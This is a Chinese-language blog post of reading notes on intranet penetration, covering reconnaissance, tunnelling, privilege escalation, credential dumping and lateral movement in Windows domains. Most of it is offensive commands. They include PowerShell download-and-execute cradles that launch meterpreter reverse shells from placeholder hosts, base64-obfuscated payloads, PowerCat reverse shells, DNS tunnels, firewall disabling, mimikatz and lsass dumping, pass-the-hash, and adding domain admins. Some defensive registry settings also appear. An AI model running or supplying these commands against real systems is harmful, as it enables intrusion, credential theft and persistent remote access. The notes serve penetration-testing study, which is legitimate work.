---
title: "Intranet Attack Reading Notes"
date: 2020-02-06T17:47:24+08:00
draft: flase
tags: [内网渗透]
categories: []
comment: true
---
Intranet Attack Reading Notes
<!--more-->

# 内网安全读书笔记
## 内网渗透测试基础
```
局域网(Local Area NetWork LAN)
工作组(Work Group)
域(Domain)
```
**活动目录主要提供以下功能**

```
账号集中管理
软件集中管理
环境集中管理
增强安全性（统一杀毒等）
更可靠、更短的宕机时间
```

- 安全域的划分

> 划分安全域的目的是将一组安全等级相同的计算机划入同一个网段。

网络访问控制策略（NACL）
DMZ（隔离区）

- 主机平台常用工具

**Kali LInux**

```
Wce(windows平局管理器->列出登陆会话、添加修改列出和删除关联凭据(LM Hash、NTLM hash、明文密码和kerberos票据))

mimikatz

Responder（不仅用于嗅探网络内所有的LLMNR 和获取主机的信息、还提供多种渗透测试环境和场景、包括https、SMB、sql server、ftp、ldap、POP3等）

DSHash(从NTDSXtract中提取用户的易于理解的散列值)

Nishang

Empire

ps_encoder.py(使用base64编码封装的powershell命令包)

smbexec(使用Samba工具的快速Psexec类工具)

后门制造工厂

Veil

Cobalt Strike

```

**Windows**

```
nmap 
wireshark
putty
sqlmap
burp
hydra

Getif(收集snmap设备信息)

Cain&&Abel(密码恢复工具、通过嗅探网络，破解加密密码，恢复无线网络密钥显示密码框、发现缓存中的密码、分析路由信息、恢复各种密码和凭据)
```

### Powershell

```
Get-help/$PSVersionTable.PSVERSION 查看powershellb版本
 
Get-Executionpolicy 查看执行策略
Restricted 脚本不能运行默认
RemoteSigned 本地可以运行
Allsigned 当脚本由受信任的发布者签名时运行
Unrestricted 允许所有脚本运行

Set-ExecutionPolicy XX 设置执行策略

```

- 常用参数

```
-ExecutionPolicy Bypass (-Exec Bypass) 绕过执行安全策略

-WindowsStyle Hidden 隐藏窗口

-NonInteractive (-NonI) 非交互模式

-noexit 执行后不退出shell
-NoLogo 启动不显示版权表示的powershell

-enc 允许传入一个base64编码过的powershell脚本字符串作为参数
```

- 绕过本地权限并执行

```
Powershell.exe -ExecutionPolicy Bypass -File PowerUp.ps1 命令行环境下绕过本地权限执行

powershell.exe -exec bypass -Command "& {import-Module C:\syst1m.ps1; Invoke-AllChecks}"
目标本地执行脚本
```

- 下载网络上脚本绕过本地权限执行

```
Powershell.exe -ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-NonIIEX(New-ObjectNet,WebClient).DownloadString("xxx.ps1");[Parameters]

Powershell.exe -ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-NonIIEX(New-ObjectNet,WebClient).DownloadString("http://xxx.com/ps.ps1"); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.1 -lport 80
```

- 使用base64混淆

```
echo "IEX(New-ObjectNet,WebClient).DownloadString("http://xxx.com/ps.ps1"); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.1 -lport 80 -Force" >raw.txt 

chmod +x ps_encode.py

./ps_encode.py -s raw.txt

Powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc xxxx
```

## 内网信息搜集

### 收集本机信息

```
ipconfig /all 获取本机网络配置信息
systeminfo | finder /B /C:"os Version" 操作系统和版本信息

echo %PROCESOR_ArCHITECTURE% 系统系统结构

wmic_product_get_name,version 结果输出到文本

Powershell.exe "Get-WmiObject -class Win32_Product | Select-Object -Property name,version" powershell收集

wmic service list brief 查询本机服务信息

tasklist 当前进程和进程用户

wmic process list brief 进程信息

wmic startup get command,caption 查看启动程序信息

schtasks /query /to LIST /V 查看计划任务

net statistics workstation 查看主机开机时间

net user 查看用户列表

net localgroup administrators 获取本地管理员信息

query user || qwinsta

netstat -ano 查询端口列表

systeminfo 查询补丁列表
wmic qfe get Caption,Descript,HotFixID,InstalledOn 查询补丁

net share 查询本机共享列表
wmic share get name,path,status

route print 查询所有可用接口的ARP缓存表
arp -a 
```

- 查询防火墙相关配置

```
netsh firewall set opmode disable 关闭防火墙（03之前）

netsh advfirewall set allprofiles state off（关闭防火墙 03之后）

netsh firewall show config 查看防火墙配置

netsh firewall add allowedprogram c:\nc.exe "allow nc" enable(03之前允许指定程序全部连接)

netsh advfirewall firewall add rule name="pass nc" dir=in action=allow programe="C:/nc.exe"(允许指定程序进入（03之后）)

netsh advfirewall add rule name="Allow nc" dir=out action=allow program="c:\nc.exe"(03之后允许指定程序退出)

netsh advifirewall firewall add rule name="Remote Desktop" protocol=Tcp dir=in localport=3389 action=allow 允许3389放行

netsh advifirewall firewall set currentprofile logging filename "C:\windows\temp\fw.log" 自定义防火墙日志存储位置
```

- 查看代理配置情况

```
reg query "HKEY_CURRENT_USER\Software\Microsoft\windows\CurrentVersion\Internet Setting" 查看127.0.0.1 1080端口情况
```

- 查询并开启远程连接服务

```
REG QUERY "HKEY_LOCAL_MACHINE|SYSTEM|CurrentControlSet\Control\TerminalServer|WinStation\RDP-TCP" /V PortNumber 查看远程连接端口

WMic path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1 03开启3389
```
```
server08和12开启远程连接
Wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where call setallowtsconnections 1

Wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminaName='RDP-TCP') call setallowtsconnections 1

red add "HKLM\SYSTEM\CURRENT|CONTROLSET\CONTROL\TERMINAL SERVER" /V fSingleSessionPerUser /t REG_DWORD /d 0 /f
```

- 自动收集信息

```
http://www.fuzzysecurity.com/scripts/files/wmic_info.rar

wmic脚本自动收集
```

- Empire

```
usemoudle situational_awareness/host/winenum 本机用户、域组成员、密码设置时间、共享信息等

situational_awareness/host/computerdetails 模块包含了系统中所有有用的信息
```

### 查询当前权限

- 查询当前权限

```
whoami 查看当前权限
whoami /all 查询sid
net user XXX /domain 查询指定用户信息
```

- 判断是否存在域

```
ipconfig /all
```

- 查看系统详细信息

```
systeminfo
```

- 查询当前登陆域及用户信息

```
net config workstation
```

- 判断主域

```
net time/domain
```

### 探测域内存活主机

- NetBIOS

```
nbt.exe 192.168.1.1
```

- ICMP 

```
for /L %I in (1,255) Do @ping -W l -n 192.168.1.%I | findstr "TTL="
```

- ARP 

```
arp.exe -t 192.168.1.0/20
arp-scan工具

usemodule situational_awarencess/network/arpscan Empire

powershell.exe -exec bypass -Command "& {Import-Moudle c:\arpsacan.ps1};Invoke-Arpscan -CIDR 192.168.1.0/20}" >> c:\log.txt Nishang中的Invoke-ARPScan.ps1
```

- 常规TCP/UDP

```
ScanLine
```

### 扫描域内端口

- telnet
- S扫描器
- Metasploit

```
auxiliary/scanner.portscan/tcp
```

- PowerSploit的INvoke-portscan.ps1脚本

```
powershell.exe -nop -exec -bypass -c "IEX(New-ObjectNet.Webclint).DownloadString('http:xxx.com/a.ps1');Invoke-Portscan"
```

- Nishang的Invoke-PortScan模块

```
Invoke-Portscan -StartAddress 192.168.250.1 -EndAddredd 192.168.250.255 -ResolveHost
```

### 收集域内信息

```
net view /domain 查询域

net view /domain:HACKE

net group /domain 用户组列表

net group "domain computer" domain 查询所有域成员计算机列表

net accounte /domain 域密码策略

nltest /domain_trusts 域信任信息
```

### 查找域控制器

- 查看域控制器机器名

```
nltest /DCLIST:hacke
```

- 查看域控制器主机名

```
NSlookup -type=SRV _ldap._tcp
```

- 查看当前时间

```
net time /domain
```

- 查看域控制器组

```
net group "Domain Controllers" /domain
```

- 域控制器机器名

```
netdom query pdc
```

### 获取域内用户和管理员信息

- 查询所有域用户列表

```
net user /domain
```

- 获取域内用户的详细信息

```
wmic useraccount get /all
```

- 查看存在的用户

```
dsquery user
```

- 常用dsquery命令

```
dsquery computer 查找目录中的计算机
contact 联系人
subnet 子网
group 组
ou 组织单位
site 站点
server  AD DC/LDS实例
user 用户
quota 配额规定
partition 分区
* 任何对象
```

- 查询本地管理员用户

```
net localgroup administrators
```

- 查询域管理员用户

```
net group "domain admins" /domain 域管理员用户

net group "ENterprise Admins" /domain 管理员用户组
```

### 定位域管理员

```
net session 看谁使用了本地资源
```

**psloggedon.exe**
**PVEFindADUser.exe**
**netsess.exe**
**hunter**
**Netview**
**PowerView**

- psloggedon.exe

>原理检查HKEY_USERS的key

```
下载地址
https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon
```

```
psloggedon [-] [-l] [-x] [computer|username]

psloggedon \\DC
```

- PVEFindADUser.exe

```
下载地址
https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn
```

```
-current/-current['username'] 所有用户
-last/-last['username'] 最后登陆用户
```

```
PVEFindADUser.exe -current
```

- netview.exe(绝大部分功能无需管理员权限)

```
下载地址
https://github.com/mubix/netview
```
```
netview.exe 参数
```
```
-f filename.txt 指定要提取主机列表的文件
-e filename.txt 指定要排除的主机名的文件
-o filename.txt 将所有输出重定向到指定的文件
-d domain 指定要提取主机列表的域
-g group 指定要锁搜的组名
-c 对已找到的共享目录/文件的访问权限进行检查
```

- Nmap的nes脚本(无需管理员权限)

```
下载地址
https://nmap.org/nsedoc/scripts/smb-enum-sessions.html
```

- PowerView

```
下载地址
https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView
```

```
Invoke-StealthUserHunter 
Invoke-UserHunter
```

- Empire

```
usemoudle situational_awareness/network/powerview/user_hunter
```

### 查找域管理员
- 本机检查

```
net group "Domain Admins" /domain 获取域管理员列表

tasklist /v 列出本机所有进程及进程用户
```

- 查询域控制器的域用户会话

```
net group "Domain Controllers" /domain 查询域控制器列表

net group "Domain Admins" /domain收集域管理员列表
```

- 收集所有活动域的会话列表

```
NetSess -h
```

- 交叉引用域管理员列表与活动会话列表

> 确定哪些IP地址有活动域令牌

1.域控制器列表dcs.txt 域管理员列表sessions.txt
```
FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i && @netsess -h % i 2>null >sessions.txt && FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a
```

2.脚本
```
https://github.com/nullbind/Other-Projects/tree/master/GDA
```

- 查询远程系统中运行的任务（通过共享的本地管理员账户运行）

```
net group "Domain Admins" /domain 查询与管理员列表

目标域系统列表添加到ips.txt文件中
收集的域管理员列表添加到names.txt中

FOR /F %i (ips.txt) DO @echo [+] %i && @tasklist /V /S %i /U user /P password 2>NUL >output.txt && FOR /F %n in (names.txt) DO @type output.txt | findstr %n >NUL && echo [!] %n was found running a process on %i && pause
```

- 扫描远程系统的NetBIOS信息

```
域系统列表 ips.txt
域管理员列表 admins.txt

for /F % i in (ips.txt) do @echo [+] Checking % i && nbtstat -A %i 2>NUL >nbsessions.txt && FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n >NUL &&echo [!] %n was found logged into %i

Nbtscan工具
for /F % i in (ips.txt) do @echo [+] Checking % i && nbtscan -f %i 2>NUL >nbsessions.txt && FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n >NUL &&echo [!] %n was found logged into %i
```

### 域管理员模拟方法

- Incognito

### PowerView

```
下载地址
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

```
Get-NetDomain 获取当前用户所在域的名称
Get-NetUser 获取所有用户的详细信息
Get-NetDomainController 获取所有域控制器的信息
Get-NetComputer 获取域内所有机器的详细信息
Get-NetOU 获取域中的OU信息
Get-NetGroup 获取所有域内组和组成员信息
Get-NetFileServer 根据spn获取当前域使用的文件服务器信息
Get-NetShare 获取域内所有的网络共享信息
Get-NetSession 获取指定服务器的会话
Get-NetRDPSession 获取服务器的远程连接
Get-NetProcess 获取远程主机的进程
Get-UserEvent 获取指定用户的日志
Get-ADObject 获取活动目录的对象
Get-NetGPO 获取域内所有的组策略对象
Get-DomainPolicy 获取域默认策略或控制器策略
Invoke-UserHUNter 获取域用户登陆的计算机信息以及该用户是否有本地管理员权限
Invoke-ProcessHunter 通过查询域内所有的机器进程找到特定用户
Invoke-UserEventHunter 根据用户日志查询某域用户登陆过哪些域机器
```

### BloodHound

```
https://github.com/BloodHoundAD/BloodHound/releases/download/2.0.4/BloodHound-win32-x64.zip
```
```
sharphound获取BloodHound需要的信息

https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe

SharpHound.exe -c all
```

### 敏感数据的防护

- office

```
高版本office可通过ProcDump获取密码
```
## 隐藏通信隧道技术
### 隐藏通信隧道基础知识
#### 判断内网连通性

- ICMP

```
ping xxx.com/192.
```

- TCP 

```
nc -zv 192.168.1.7 80
```

- http

```
curl baidu.com 80
```

- DNS

```
nsllokup
nslookup www.baidu.com ip
```
```
dig
dig ww.baidu.com -A
```

- 代理情况

```
ping -n l -a ip
```

### 网络层隧道（ipv6、icmp）

- IPV6

```
socat
6tunnel
nt6tunnel
```

- ICMP

```
关闭本地icmp应答
Sysctl -w net.ipv4.icmp_echo_ignore_all=1
```

```
icmpsh
https://github.com/inquisb/icmpsh.git

PingTunnel
icmptunnel
powershell icmp
```

### 传输层隧道技术(tcp、udp、常规端口转发)

- lcx

```
目标机器
lcx.exe -slave 公网主机ip 4444 127.0.0.1 3389

vps
lcx.exe -listen 4444 5555

本地端口转发
lcx -tran 53 目标主机ip地址 3389
```

- netcat(nc)

#### PowerCat(nc的powershell版本)

- 导入

```
Import-Moudle powercat.ps1
```

- nc正常连接PowerCat

```
目标
powercat -l -p 8080 -c cmd.exe -v 

本地
netcat 192.168.130 8080 -vv
```

- nc反向链接PowerCat

```
本地
nc -l -p 8888 -vv
目标
powercat -c 192.xxx.xxx.xxx -p 8888 -v -e cmd.exe
```

- PowerCat DNS 隧道

```
安装dnscat
cd dnscat2/server/
gem install bundler
bundle install

服务端
ruby dnscat2.rb ttpowercat.test -e open --no-cache

目标机

powercat -c 192.xxx.xxx.xxx -p 53 -dns ttpowercat.test -e cmd.exe
```
- PowerCat 生成payload

```
powercat -l -p 8000 -e cmd -v -g >> shell.ps1 上传
powercat -c 10.xxx.xxx.xxx -p 8080 -v 监听

编码
powercat -c xxx.xxx.xxx.xxx -p 9999 -ep -ge
监听
powercat -l -p 9999 -v
```

### 应用层隧道技术

#### ssh

- ssh参数

```
-C 压缩传输、提高传输速度
-f 将ssh传输转入后台执行、不占用当前的shell
-N 建立静默链接（建立了连接、但是看不到具体会话）
-g 允许远程主机连接本地用于转发的端口
-L 本地端口转发
-R 远程端口转发
-D 动态转发（SOCKS代理）
-F 指定ssh端口
```

- 本地转发

```

vps kali linux(192.168.1.4)
web服务器(192.168.1.11/1.1.1.16)
数据库服务器(1.1.1.10)
域控制器(1.1.1.2)

vps上
ssh -CfNg -L 1153(vps端口):1.1.1.10(目标主机):3389（访问端口）

rdesktop 127.0.0.1:1153
```

- 远程转发

```
web可以访问外网

vps kali linux(1.1.1.4)
web(1.1.1.200)
数据库(1.1.1.10)
域控制器(1.1.1.2)

web服务器上执行
ssh -CfNg -R 3307(vps端口):1.1.1.10（目标主机）:3389 root@192.168.1.4

rdesktop 127.0.0.1:3307
```

- 动态转发

```

vps kali linux(192.168.1.4)
web服务器(192.168.1.11/1.1.1.16)
数据库服务器(1.1.1.10)
域控制器(1.1.1.2)

ssh -CfNg -D 7000 root@192.168.1.11

浏览器设置代理
```

#### http/https协议

- reGeorg

```
https://github.com/sensepost/reGeorg

python reGeorgSocksProxy.py -u http://xxx:8080/tunne;.jsp -p 9999
proxyChains 代理访问
```

- meterpreter
- tunna

#### DNS

- 查看DNS的连通性

```
cat /etc/resoiv.conf|grep -v '#' 查询内部域名及IP地址

nslookup hacks.testlab 内部dns连通性

nklookup baidu.com 外部dns连通性
```

##### dnscat2(支持多个会话)

```
https://github.com/iagox86/dnscat2
```

-  部署域名解析

```
创建A记录
域名A记录指向vps服务器

创建ns记录（设置子域名dns服务器的）
dnsch子域名解析结果指向域名
```

- 安装dnscat2服务端

```
sudo ruby ./dnscat2.rb vpn.xxx.com -e open -c syst1m.com --no-cache

sudo ruby ./dnscat2.rb --dns server=127.0.0.1,port=533.type=txt --secret=syst1m.com
```

- 目标主机安装客户端

```
make install 编译

dnscat.exe --ping vpn.xxx.com 测试连通性

dnscat.exe --dns domain=vpn. --secret syst1m.com

dnscat --dns server=ip,port=53,type=txt --secret=syst1m.com
```

- powershell版本

```
https://github.com/lukebaggett/dnscat2-powershell

IMport-Moudle .\dnscat2.ps1或者IEX(New-Object System.Net.Webclient).DownloadString('')

开启dnscat2-powershell服务
start-Dnscat2 -Domain vpn.xxx.com --DNSServer 1.x.x.x

IEX加载脚本方式（内存中打开dnscat客户端）
powershell.exe -nop -w hidden -c (IEX(New-Object System.Net.Webclient).DownloadString(''),start-Dnscat2 -Domain vpn.xxx.com --DNSServer 1.x.x.x)
```

- 参数

```
exec 打开程序
download 下载文件
help 帮助
clear清屏
delay 修改远程响应延时
shell 得到一个反弹shell
kill 切断通道
listen 类似ssh -l参数 listen 0.0.0.0:53 192.168.1.1 3389
ping 用于确认机器是否在线
windows -i 连接某个通道
```

#### iodine(支持linux、mac、windows)

```
https://github.com/Al1ex/iodine
```

- 安装服务端

```
iodined -f -c -P syst1m 192.168.0.1 vpn.xxx.com -Dp
```

- 安装客户端

```
iodine -f -p syst1m vpn.xxx.com -M 200
```

- 使用dns隧道

```
mstsc 10.0.0.1:3389
```

### SOCKS代理
- EarthWorm

```
1.正向sockes5服务器
ew -s ssocked -l 888

2. 反弹sockes5服务器(公网vps)
ew -e rcsocks -i 1080 -e 888
ew -s rssocks - d xxx.xxx.xxx.xxx -e 888 (内网web服务器）
```

- reGeorg
- sSocks
- SocksCap64
- Proxifier
- ProxyChains

```
vi /etc/proxychains.conf
cp /usr/lib/proxychains3/proxyresoly /usr/bin
proxychains firefox
```

### 压缩数据

####RAR
- 以rar格式压缩解压

```
压缩
rar.exe a -k -r- s -m3 E:\webs\1.rar E:|webs

解压
Rar.exe e E:\webs\1.rar
```

- 分卷压缩/解压

```
压缩
Rar.exe a -m0 -r -v20m E:\test.rar E:\API

解压
Rar.exe x E:\test.part01.rar e:\xl
```

####7-zip

- 普通压缩

```
压缩
7z.exe a -r -p12345 E:\webs\1.7z e:\webs

解压
7z.exe x -p12345 E:\webs\1.7z -oE:\x
```

- 分卷压缩

```
压缩
7z.exe -r -vlm -padmin a e:\test.7z E:\API

解压
7z.exe x -padmin E:\test.7z.001 -oE:\xl
```

### 上传和下载

- Ftp上传

```
本地vps搭建ftp服务传输
```
- VBS上传

```
1.输入命令
    Set Post=CreateObject("Msxm12.XMLHTTP")>>downloads.vbs
    set shell = CreateObject("Wscript.Shell")
    Post.OPen "GET","http://server_ip/target.exe",0
    Post.Send()
    Set aGet = CreateObject(ADODB.stream")
    aGet.Mode = 3
    aGet.Type = 1
    aGet.Open()
    aGet.Write(Post.responseBody)
    aGet.SaveToFile "c:\test\target.exe"
    
2.执行脚本
    Cscript download.vbs
```

- 利用Debug上传(只支持小于64kb文件)

```
kali linix位置
/usr/share/windows-binaries
```
```
转为十六进制

wine exe2bat.exe ew.exe ew.txt
```

- Nishang

>> exetotext.ps1 

```
转换
.\ExetoText c:msf.exe c:msf.txt

下载并执行文本文件
Download_Execute http://xxx.xxx.xx.xx/msf.txt
```

- bitsadmin(xp之后自带)
- powershell下载

## 权限提升分析及防御
### 系统内核溢出漏洞提权
#### 通过手动执行命令发现缺失补丁

- 补丁参考

>https://github.com/SecWiki/windows-kernel-exploits

```
whoami /groups 查看当前权限
systeminfo 查看补丁
Wmic qfe get Caption,Description,HotFixID,INstalledOn 列出已经安装的补丁

Caption,Description,HotFixID,INstalledOn | findstr /c:"KB3143141"  /c:"KB316902" 查找指定补丁
```
- MS16-032.ps1(KB3139914)

```
Invoke-MS16-032 -APPlication cmd.exe -Commandline "/c net user 1 1 /add"

Invoke-MS16-032 -APPlication cmd.exe notpad.exe
```

- 利用meatsploit发现缺失补丁

```
post/windows/gather/enum_patches模块
```

- Windows Exploit Suggester

```
1. systeminfo 获取补丁情况
2. ./windows-exploit-suggester.py --update 下载安全公告数据库
3. pip install xlrd -upgrade 安装xlrd模块
4. ./windows-exploit-suggester.py -d xx.xls -i patches.txt
```

- local_exploit_suggester模块（识别系统中可能被利用的漏洞）

```
post/multi/recon/local_exploit_suggester
```

- powershell中Sherlock脚本

```
Import-Moudle c:\Sherlock.ps1
Find-AllVulns
```

- Cobalt Strike(3.6以后)

```
elevate ms14-058 smb
```

### Windows操作系统配置错误利用
#### 系统服务权限配置错误

- 下载地址

```
PowerUp
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
```

- 运行脚本

```
powershell.exe -exec bypass -Command "& (Import_Moudle .\PowerUp.ps1; Invoke-Allcheck)"

powershell.exe -nop -exec bypass  -c "IEX (New-Object Net.Webclient).DownloadString('http://xxx.com/PowerUp.ps1'); Invoke-Allcheck"
```

- 利用C#脚本添加用户(PowerUp的Install-ServiceBinary模块)

```
powershell.exe -nop -exec bypass IEX (New-Object Net.Webclient).DownloadString('c:\PowerUp.ps1');Install-ServiceBinary-ServiceName '服务名' -UserName syst1m -Password syst1m
```

- 重启系统生效

- 利用msf

```
service_permissions 模块 
利用目标机器上的每一个有缺陷的服务
```

#### 注册表键AlwayslnstallElevated

- 检测注册表键是否被设置

```
powershell.exe -nop -exec bypass IEX (New-Object Net.Webclient).DownloadString("c:/powerupps1");Get-RegisterAlwaysInstallElevated 
```

- 生成MSI文件

```
Write-UserAddMSI
```
 
- 普通权限运行MSi文件


#### 可信任服务路径漏洞
 
 - 检测漏洞

 ```
 wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v    """
```

- 检测是否有可写权限

```
icacls 

everyone 完全控制权限（所有用户都有修改这个文件的权限）
M 修改
F 完全控制
CI 丛属容器将继承访问控制项
OI 从属文件将继承访问控制项
```
 
- 重启服务

```
恶意文件重命名上传

sc stop service_name
sc start service_name
```

- MSF模块

```
exploit/windows/local/trusted_service_path

set AutoRunScript migrate -f 自动迁移
```

#### 自动安装配置文件

>可能包含用户名密码

- 搜索配置文件

```
dir /b /s c:\Unattend.xml
```
```
msf
post/windows/gather/enum_unattend
```

#### 计划任务

- 查看计划任务

```
schtasks /query /fo LIST /v
```

- AccessChk

```
http://technet.microsoft.com/ZH-cn/sysinternals/bb664922
```

```
accesschk “username” c:\windows\system32
查看username用户对c:\windows\system32目录的操作权限

找出某个驱动器下所有权限配置有缺陷的文件夹路径
accesschk.exe–uwdqsUsersc:
accesschk.exe–uwdqs"AuthenticatedUsers"c:

找出某个驱动器下所有权限配置有缺陷的文件路径
accesschk.exe–uwqsUsersc:*.*
accesschk.exe–uwqs"AuthenticatedUsers"c:*.*

accesschk.exe -uwcqv "Power Users" *  获取可以操作的服务名称信息
sc qc kdc查询kdc服务详细信息

查看某个服务的权限设置
accesschk -cv [service name]
```

#### Empire

> 查找系统中的漏洞

```
usemoudle privesc/powerup/allchecks
excute
```

### 组策略首选项提权

-  SYSVOL

```
用来存放登陆脚本、组策略数据以及其他域控制器需要的域信息等

C:\Windows\SYSVOL\DOMAIN\Policics
```

- 常见组策略首选项（GPP）

```
映射驱动器（Drivers.xml）
创建本地用户
数据源（DataSources.xml）
打印机配置（Printers.xml）
创建/更新服务（Services.xml）
计划任务(ScheduledTasks.xml)
```

#### 组策略首选项提权

- 创建组策略

```
手动更新组策略
gpupdate
```

##### 获取组策略凭据

- 手动查找cpassword

```
type \\dc\sysvol\pentest.com\Policies\{31B2F340-016D-11D2-945F-00c04FB984F9}\MACHINE\Perferences\Group\Groups.xml

解密
python gpprefdecryp.pt 密文
```
- 使用PowerShell获取cpassword

```
Get-GPPPassword.ps1
```

- Metasploit

```
post/windows/gather/credentials/gpp
```

- Empire

```
usemoudle privsec/gpp
```

### BypassUAC（用户账户控制）

- bypassuac模块

```
exploit/windows/local/bypassuac
```

- Runas模块

```
exploit/windows/local/ask 弹窗，点击反弹shell
```

- Nishang中的Invoke-PsUACme模块

```
Invoke-PsUACme -Verbose 使用sysprep方法并执行默认payload

Invoke-PsUACme -method oobe -Verbose 使用oobs方法并执行默认payload

Invoke-PsUACme -method oobe -payload "powershell -windiwstyle hidden -e YourEncodePayload" 使用-payload参数自行指定要执行的payload
```

- Empire bypassuac模块

```
1.usemoudle privesc/bypassuac
```

```
2.bypassuac_wscript模块
只适用于win7
```

### 令牌窃取
- 令牌分类

```
Delegation Tokens 授权令牌 支持交互
Impersonation Tokens 非交互式
```

- 令牌窃取

>拥有meterpreter shell

```
use incognito
list-tokens -u 列出可用令牌
impersonate_token 主机名\\用户名 假冒用户
```

- Rotten Potato(快速模拟令牌)

```
https://github.com/foxglovesec/RottenPotato.git
```

```
use incognito
list-tokens -u 列出可用令牌
upload exe
execute -HC -f rottenpotato.exe
impersonate_token "NT AUTHORITY\\SYSTEM" 
```

### 添加域管理员

- cmd

```
net user shuteer abc123 /ad /domain
net group "domain admins shuteer /ad /domain"
net group "domain_admins" /domain
```

- meterpreter

```
add_user shuteer abc123 -h 1.1.1.2
add_group_user "Domain Admins" shuteer -h 1.1.1.2
```

#### Empire下的令牌窃取

1.creds

- 查看密码

```
creds 查看列出来的密码
```

- 窃取令牌

```
pth ID (ID为credID)
```

- 查看当前进程是否有域用户进程窃取

```
ps 查看进程
steal_token  12004 获取令牌
revtoself 恢复令牌权限
```

### 无凭证条件下的权限获取

- Responder

```
https://github.com/SpiderLabs/Responder.git
```

## 域内横向移动分析及防御
### 常用windows远程连接和相关命令
#### IPC

- 建立ipc连接

```
net use \\192.168.100.190\ipc$ "Aa123456@" /user:administrator
```

- ipc$利用条件

```
（1）开启了135、445端口
（2）管理员开启了默认共享
```

- ipc$失败原因

```
（1）用户名密码错误
（2）目标没有打开ipc$默认共享
（3）不能连接135、445端口
（4）命令输入错误
```
#### 使用windows自带工具获取远程主机信息

- dir命令

```
dir
```

- tasklist

```
tsklist 列出进程
```

#### 计划任务

- at(08之前)

```
1.net time \\192.168.100.190
2.copy calc.bat \\192.168.100.190\c$
3.at \\192.168.100.190 4:11pm c:\calc.bat
4.at \\192.168.100.190 7 /delete

执行命令

at \\192.168.100.190 4:41pm cmd.exe \c "ipconfig>c:/1.txt"
type \\192.168.100.190\c$\1.txt
```

- schtasks（08之后）

```
schtasks /create /s 192.168.100.190 /tn /test /sc onstat /tr c:\calc.bat /ru system /f 创建计划任务（test 计划任务名字 启动权限为system）

schtasks /run /s 192.168.100.190 / i /tn "test" 运行计划任务

schtasks /delect /s 192.168.100.190 /tn "test" /F 删除计划任务

net use 名称 /del /y 删除ipc$
```

### windows系统散列值获取
#### 单机密码抓取

- GetPass
- PwDump7
- QuarksPwDump

```
QuarksPwDump.exe --dump-hash-local
```
##### 通过SAM和system文件抓取密码

- 导出SAM和System文件

```
reg save hklm\sam sam.hive
reg save hklm\system system.hive
```

- 读取SAM和system文件获得NTLM Hash

```
mimikatz
lsadump::sam /sam:sam.hive /system:system hive
```
- mimikatzz直接读取本地SAM

```
privilege::debug
lsadump::sam
```

##### 使用mimikatz在线读取SAM文件

```
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
```

##### 使用mimikatz离线读取lsass.dmp文件

- 导出lsass.dmp文件

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

- mimikatz导出散列值

```
sekurlsa::minidump lsass.DMP 加载文件
sekurlsa::logonPasswords full 导出密码散列
```

##### Powershell

- Nishang Get-PassHashes.ps1

```
Import-Moudle .\Get-PassHashes.ps1
GetPassHashs
```
- powershell远程加载mimikatz获取散列值

#### 使用Hashcat获取密码

- 下载

```
make
make install
./hashcat -h
```
- Hashcats使用

```
hashcat -b 测试当前机器基准速度
-m 指定散列值
-a number 破解模式

hashcat -a 0 -m xx <hashfile> <zidian> <zidian2>
```

- 破解Windows散列值

```
hashcat -m 1000 -a 0 -o winpassok.txt win.hash password.lst --username
```

- 破解 WIFI握手包

```
aircrack-ng <out.cap> -J <out.hccap>
hashcat -m 2500 out.hccap dict.txt
```

#### 防御攻击者抓取明文密码

- 设置Active Directory 2012 R2功能级别

```
Protected User 添加<-组
```

- 安装KB2871997

```
安装补丁
禁用Administrator账号
```

- 修改注册表

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0  修改

reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential 查询
```

- 防止mimikatz抓密码

```
删除拥有debug权限的本地管理员从Administrator组中
```

### 哈希传递攻击

- 哈希传递攻击

```
mimikatz "privilege::debug" "sekurlsa::pth /user:administrator /domain:pentest.com /ntlm:D(Fxxxxxx"
```
- 使用AES-256哈希传递

```
(1)抓取AES-256密钥
mimikatz "privilege::debug" "sekurlsa::ekeys"

(2)哈希传递
mimikatz "privilege::debug" "sekurlsa::pth /user:administrator /domain:pentest.com /aes256:2381fXXXX"
```

- 票据传递攻击

```
mimikatz
(1)导出票据
mimikatz "privilege::debug" "sekurlsa::tickets /export"
kerberos::purge 清除票据
mimikatz "kerberos::ptt "c:\ticket.kirbi" 注入票据
```

```
kekeo票据传递

https://github.com/gentilkiwi/kekeo

kekeo "tgt:ask /user:administrator /domain:pentest.com /ntlm:D9F9xxxx" 生成票据
klist purge 清除票据
kerberos::ptt TGT_administrator@PENTST>COM_krbtgt.com@PENTEST.COM>kirbi
```

### PsExec使用
#### psTools
```
https://download.sysinternals.com/files/PSTools.zip
```

- Sysyem权限的shell(-s)

```
PsExec.exe -accepteula \\192.xxx.xxx.xxx -s cmd.exe
```

- Administrator权限的

```
Psexec.exe -accepteula \\192.xxx.xxx.xxx cmd.exe 
```

- 账号密码远程连接

```
psexec \\192.xxx.xxx.xxx -u administrator -p Aa123456 cmd.exe
```

#### metasploit中的psexec

```
exploit/windows/smb/psexec
exploit/windows/smb/psexec_psh(powershell版本)
```

### WMI使用

- 基本命令

```
